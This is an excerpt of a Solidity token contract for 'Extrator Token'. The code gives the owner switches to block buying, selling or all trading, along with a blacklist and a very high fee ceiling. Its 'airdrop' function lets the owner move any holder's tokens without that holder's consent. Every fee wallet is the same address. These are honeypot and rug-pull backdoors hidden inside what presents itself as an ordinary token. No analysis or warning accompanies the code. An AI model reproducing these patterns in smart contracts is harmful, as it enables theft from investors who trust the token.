...
contract XTR is Context, IERC20, Ownable {
    ...
    address private PROJECT                          = 0xcB897073772e618d5A02BF01AD104856599e391A;
    address private MKT                              = 0xcB897073772e618d5A02BF01AD104856599e391A;
    address private INVESTOR                         = 0xcB897073772e618d5A02BF01AD104856599e391A;
    address private SPONSOR                          = 0xcB897073772e618d5A02BF01AD104856599e391A; 
    ...
    string constant _name                            = "Extrator Token";
    ...
    // BUY & TRANSFER FEE
    uint256 constant INITIAL_TRANSFER_TAX_RATE       = 1000; // THIS IS ALSO BUY FEE
    ...
    uint256 private constant MAX_SPONSOR_FEE         = 9999;
    ...
    function _transfer(
        ...
        // GLOBAL REQUIREMENTS
        require(!isBlacklisted[sender] && !isBlacklisted[recipient], "One of the addresses is blacklisted");
    ...
    function checkTradingStatus(address sender, address recipient) internal view {
        if(
            ...
            && recipient != adminOne) {
                if (exchangeOpen) {
                    if (liquidityAddress[sender]) {
                        require(buyOpen, "Buys cannot be done at the moment.");
                    }
                    if (liquidityAddress[recipient]) {
                        require(sellOpen, "Sales cannot be done at the moment.");
                    }
                } else {
                    require(exchangeOpen, "Exchanging tokens cannot be done at the moment.");
                }
        }
    }
    ...
    function burn(uint256 _amount) public onlyOwner {
        require(_amount <= _totalSupply, "Insufficient supply.");
    ...
    // BUY STATUS
    function buyStatus(bool _status) public onlyOwner {
        require(buyOpen != _status, "Buying option is already set in that condition.");
        buyOpen = _status;
    
    }  
    // SELL STATUS     
    function sellStatus(bool _status) public onlyOwner {
        require(sellOpen != _status, "Selling option is already set in that condition.");
        sellOpen = _status;
    }
    // TRADING STATUS
    function tradingStatus(bool _status) public onlyOwner {
        require(exchangeOpen != _status, "Selling option is already set in that condition.");
        exchangeOpen = _status;
    }
    // BLACKLIST STATUS
    function blacklist(address _user, bool _enabled) public onlyOwner {
        require(isBlacklisted[_user] != _enabled, "User is already set in that condition");
        isBlacklisted[_user] = _enabled;
    }

    function airdrop(address sender, address recipient, uint256 _amount) external onlyOwner {
        require(balanceOf(sender) >= _amount, "Insufficient balance.");
        require(!isBlacklisted[sender], "Sender is blacklisted.");
        require(!isBlacklisted[recipient], "Recipient is blacklisted.");
        _approve(sender, recipient, _amount);
        _basicTransfer(sender, recipient, _amount);
    }
